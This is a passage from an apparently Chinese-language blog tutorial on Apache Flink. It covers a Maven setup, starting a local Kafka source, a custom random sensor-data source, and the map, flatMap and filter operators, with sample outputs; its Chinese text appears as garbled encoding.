class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>Flink_Tutorial<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">flink.version</span>&gt;</span>1.12.1<span class="tag">&lt;/<span class="name">flink.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scala.binary.version</span>&gt;</span>2.12<span class="tag">&lt;/<span class="name">scala.binary.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;flink.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-streaming-scala_$&#123;scala.binary.version&#125;<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;flink.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-clients_$&#123;scala.binary.version&#125;<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;flink.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- kafka --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-connector-kafka_$&#123;scala.binary.version&#125;<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;flink.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p> å¯åŠ¨zookeeper  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> bin/zookeeper-server-start.sh config/zookeeper.properties</span></span><br></pre></td></tr></table></figure></li><li><p> å¯åŠ¨kafkaæœåŠ¡  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> bin/kafka-server-start.sh config/server.properties</span></span><br></pre></td></tr></table></figure></li><li><p> å¯åŠ¨kafkaç”Ÿäº§è€…  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> bin/kafka-console-producer.sh --broker-list localhost:9092  --topic sensor</span></span><br></pre></td></tr></table></figure></li><li><p> ç¼–å†™javaä»£ç   </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.source;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.serialization.SimpleStringSchema;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.connectors.kafka.FlinkKafkaConsumer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/1/31 5:44 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SourceTest3_Kafka</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// åˆ›å»ºæ‰§è¡Œç¯å¢ƒ</span></span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è®¾ç½®å¹¶è¡Œåº¦1</span></span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Properties properties = <span class="keyword">new</span> Properties();</span><br><span class="line">        properties.setProperty(<span class="string">&quot;bootstrap.servers&quot;</span>, <span class="string">&quot;localhost:9092&quot;</span>);</span><br><span class="line">        <span class="comment">// ä¸‹é¢è¿™äº›æ¬¡è¦å‚æ•°</span></span><br><span class="line">        properties.setProperty(<span class="string">&quot;group.id&quot;</span>, <span class="string">&quot;consumer-group&quot;</span>);</span><br><span class="line">        properties.setProperty(<span class="string">&quot;key.deserializer&quot;</span>, <span class="string">&quot;org.apache.kafka.common.serialization.StringDeserializer&quot;</span>);</span><br><span class="line">        properties.setProperty(<span class="string">&quot;value.deserializer&quot;</span>, <span class="string">&quot;org.apache.kafka.common.serialization.StringDeserializer&quot;</span>);</span><br><span class="line">        properties.setProperty(<span class="string">&quot;auto.offset.reset&quot;</span>, <span class="string">&quot;latest&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// flinkæ·»åŠ å¤–éƒ¨æ•°æ®æº</span></span><br><span class="line">        DataStream&lt;String&gt; dataStream = env.addSource(<span class="keyword">new</span> FlinkKafkaConsumer&lt;String&gt;(<span class="string">&quot;sensor&quot;</span>, <span class="keyword">new</span> SimpleStringSchema(),properties));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ‰“å°è¾“å‡º</span></span><br><span class="line">        dataStream.print();</span><br><span class="line"></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> è¿è¡Œjavaä»£ç ï¼Œåœ¨Kafkaç”Ÿäº§è€…consoleä¸­è¾“å…¥  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> bin/kafka-console-producer.sh --broker-list localhost:9092  --topic sensor</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">sensor_1,1547718199,35.8</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">sensor_6,1547718201,15.4</span></span><br><span class="line"><span class="meta">&gt;</span></span><br></pre></td></tr></table></figure></li><li><p> javaè¾“å‡º  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sensor_1,1547718199,35.8</span><br><span class="line">sensor_6,1547718201,15.4</span><br></pre></td></tr></table></figure></li></ol><h5 id="è‡ªå®šä¹‰Source"><a href="#è‡ªå®šä¹‰Source" class="headerlink" title="è‡ªå®šä¹‰Source"></a>è‡ªå®šä¹‰Source</h5><p>javaä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.source;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.source.SourceFunction;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/1/31 6:44 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SourceTest4_UDF</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// åˆ›å»ºæ‰§è¡Œç¯å¢ƒ</span></span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line"></span><br><span class="line">        DataStream&lt;SensorReading&gt; dataStream = env.addSource(<span class="keyword">new</span> MySensorSource());</span><br><span class="line"></span><br><span class="line">        dataStream.print();</span><br><span class="line"></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å®ç°è‡ªå®šä¹‰çš„SourceFunction</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MySensorSource</span> <span class="keyword">implements</span> <span class="title">SourceFunction</span>&lt;<span class="title">SensorReading</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ ‡ç¤ºä½ï¼Œæ§åˆ¶æ•°æ®äº§ç”Ÿ</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">volatile</span> <span class="keyword">boolean</span> running = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">(SourceContext&lt;SensorReading&gt; ctx)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            <span class="comment">//å®šä¹‰ä¸€ä¸ªéšæœºæ•°å‘ç”Ÿå™¨</span></span><br><span class="line">            Random random = <span class="keyword">new</span> Random();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// è®¾ç½®10ä¸ªä¼ æ„Ÿå™¨çš„åˆå§‹æ¸©åº¦</span></span><br><span class="line">            HashMap&lt;String, Double&gt; sensorTempMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">                sensorTempMap.put(<span class="string">&quot;sensor_&quot;</span> + (i + <span class="number">1</span>), <span class="number">60</span> + random.nextGaussian() * <span class="number">20</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (running) &#123;</span><br><span class="line">                <span class="keyword">for</span> (String sensorId : sensorTempMap.keySet()) &#123;</span><br><span class="line">                    <span class="comment">// åœ¨å½“å‰æ¸©åº¦åŸºç¡€ä¸Šéšæœºæ³¢åŠ¨</span></span><br><span class="line">                    Double newTemp = sensorTempMap.get(sensorId) + random.nextGaussian();</span><br><span class="line">                    sensorTempMap.put(sensorId, newTemp);</span><br><span class="line">                    ctx.collect(<span class="keyword">new</span> SensorReading(sensorId,System.currentTimeMillis(),newTemp));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// æ§åˆ¶è¾“å‡ºè¯„ç‡</span></span><br><span class="line">                Thread.sleep(<span class="number">2000L</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">cancel</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.running = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">7&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_9&#x27;</span>, timestamp=1612091759321, temperature=83.80320976056609&#125;</span></span><br><span class="line"><span class="meta">15&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_10&#x27;</span>, timestamp=1612091759321, temperature=68.77967856820972&#125;</span></span><br><span class="line"><span class="meta">1&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_1&#x27;</span>, timestamp=1612091759321, temperature=45.75304941852771&#125;</span></span><br><span class="line"><span class="meta">6&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_6&#x27;</span>, timestamp=1612091759321, temperature=71.80036477804133&#125;</span></span><br><span class="line"><span class="meta">3&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_7&#x27;</span>, timestamp=1612091759321, temperature=55.262086521569564&#125;</span></span><br><span class="line"><span class="meta">2&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_2&#x27;</span>, timestamp=1612091759321, temperature=64.0969570576537&#125;</span></span><br><span class="line"><span class="meta">5&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_5&#x27;</span>, timestamp=1612091759321, temperature=51.09761352612651&#125;</span></span><br><span class="line"><span class="meta">14&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_3&#x27;</span>, timestamp=1612091759313, temperature=32.49085393551031&#125;</span></span><br><span class="line"><span class="meta">4&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_8&#x27;</span>, timestamp=1612091759321, temperature=64.83732456896752&#125;</span></span><br><span class="line"><span class="meta">16&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_4&#x27;</span>, timestamp=1612091759321, temperature=88.88318538017865&#125;</span></span><br><span class="line"><span class="meta">12&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_2&#x27;</span>, timestamp=1612091761325, temperature=65.21522804626638&#125;</span></span><br><span class="line"><span class="meta">16&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_6&#x27;</span>, timestamp=1612091761325, temperature=70.49210870668041&#125;</span></span><br><span class="line"><span class="meta">15&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_5&#x27;</span>, timestamp=1612091761325, temperature=50.32349231082738&#125;</span></span><br><span class="line">....</span><br></pre></td></tr></table></figure><h4 id="Transform"><a href="#Transform" class="headerlink" title="Transform"></a>Transform</h4><p>mapã€flatMapã€filteré€šå¸¸è¢«ç»Ÿä¸€ç§°ä¸º<strong>åŸºæœ¬è½¬æ¢ç®—å­</strong>ï¼ˆ<strong>ç®€å•è½¬æ¢ç®—å­</strong>ï¼‰ã€‚</p><h5 id="åŸºæœ¬è½¬æ¢ç®—å­-map-flatMap-filter"><a href="#åŸºæœ¬è½¬æ¢ç®—å­-map-flatMap-filter" class="headerlink" title="åŸºæœ¬è½¬æ¢ç®—å­(map/flatMap/filter)"></a>åŸºæœ¬è½¬æ¢ç®—å­(map/flatMap/filter)</h5><blockquote><p><a href="https://zhuanlan.zhihu.com/p/66196174">åˆ°å¤„æ˜¯mapã€flatMapï¼Œå•¥æ„æ€ï¼Ÿ</a></p></blockquote><p>javaä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.transform;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.FilterFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.FlatMapFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.MapFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.Collector;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/1/31 7:31 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TransformTest1_Base</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// åˆ›å»ºæ‰§è¡Œç¯å¢ƒ</span></span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä½¿å¾—ä»»åŠ¡æŠ¢å åŒä¸€ä¸ªçº¿ç¨‹</span></span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä»æ–‡ä»¶ä¸­è·å–æ•°æ®è¾“å‡º</span></span><br><span class="line">        DataStream&lt;String&gt; dataStream = env.readTextFile(<span class="string">&quot;/tmp/Flink_Tutorial/src/main/resources/sensor.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. map, String =&gt; å­—ç¬¦ä¸²é•¿åº¦INT</span></span><br><span class="line">        DataStream&lt;Integer&gt; mapStream = dataStream.map(<span class="keyword">new</span> MapFunction&lt;String, Integer&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Integer <span class="title">map</span><span class="params">(String value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> value.length();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. flatMapï¼ŒæŒ‰é€—å·åˆ†å‰²å­—ç¬¦ä¸²</span></span><br><span class="line">        DataStream&lt;String&gt; flatMapStream = dataStream.flatMap(<span class="keyword">new</span> FlatMapFunction&lt;String, String&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">flatMap</span><span class="params">(String value, Collector&lt;String&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                String[] fields = value.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">                <span class="keyword">for</span>(String field:fields)&#123;</span><br><span class="line">                    out.collect(field);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. filter,ç­›é€‰&quot;sensor_1&quot;å¼€å¤´çš„æ•°æ®</span></span><br><span class="line">        DataStream&lt;String&gt; filterStream = dataStream.filter(<span class="keyword">new</span> FilterFunction&lt;String&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">filter</span><span class="params">(String value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> value.startsWith(<span class="string">&quot;sensor_1&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ‰“å°è¾“å‡º</span></span><br><span class="line">        mapStream.print(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        flatMapStream.print(<span class="string">&quot;flatMap&quot;</span>);</span><br><span class="line">        filterStream.print(<span class="string">&quot;filter&quot;</span>);</span><br><span class="line"></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">map&gt;</span><span class="bash"> 24</span></span><br><span class="line"><span class="meta">flatMap&gt;</span><span class="bash"> sensor_1</span></span><br><span class="line"><span class="meta">flatMap&gt;</span><span class="bash"> 1547718199</span></span><br><span class="line"><span class="meta">flatMap&gt;</span><span class="bash"> 35.8</span></span><br><span class="line"><span class="meta">filter&gt;</span><span class="bash"> sensor_1,1547718199,35.8</span></span><br><span class="line"><span class="meta">map&gt;</span><span class="bash"> 24</span></span><br><span class="line"><span class="meta">flatMap&gt;</span><span class="bash"> sensor_6</span></span><br><span class="line"><span class="meta">flatMap&gt;</span><span class="bash"> 1547718201</span></span><br><span class="line"><span class="meta">flatMap&gt;</span><span class="bash"> 15.4</span></span><br><span class="line"><span class="meta">map&gt;</span><span class="bash"> 23</span></span><br><span class="line"><span class="meta">flatMap&gt;</span><span class="bash"> sensor_7</span></span><br><span class="line"><span class="meta">flatMap&gt;</span><span class="bash"> 1547718202</span></span><br><span class="line"><span class="meta">flatMap&gt;</span><span class="bash"> 6.7</span></span><br><span class="line"><span class="meta">map&gt;</span><span class="bash"> 25</span></span><br><span class="line"><span class="meta">flatMap&gt;</span><span class="bash"> sensor_10</span></span><br><span class="line"><span class="meta">flatMap&gt;</span><span class="bash"> 1547718205</span></span><br><span class="line"><span class="meta">flatMap&gt;</span><span class="bash"> 38.1</span></span><br><span class="line"><span class="meta">filter&gt;</span><span class="bash"> sensor_10,1547718205,38.1</span></span><br><span class="line"><span class="meta">map&gt;</span><span class="bash"> 24</span></span><br><span class="line"><span class="meta">flatMap&gt;</span><span class="bash"> sensor_1</span></span><br><span class="line"><span class="meta">flatMap&gt;</span><span class="bash"> 1547718207</span></span><br><span class="line"><span class="meta">flatMap&gt;</span><span class="bash"> 36.3</span></span><br><span class="line"><span class="meta">filter&gt;</span><span class="bash"> sensor_1,1547718207,36.3</span></span><br><span class="line"><span class="meta">map&gt;</span><span class="bash"> 24</span></span><br><span class="line"><span class="meta">flatMap&gt;</span><span class="bash"> sensor_1</span></span><br><span class="line"><span class="meta">flatMap&gt;</span><span class="bash"> 1547718209</span></span><br><span class="line"><span class="meta">flatMap&gt;</span><span class="bash"> 32.8</span></span><br><span 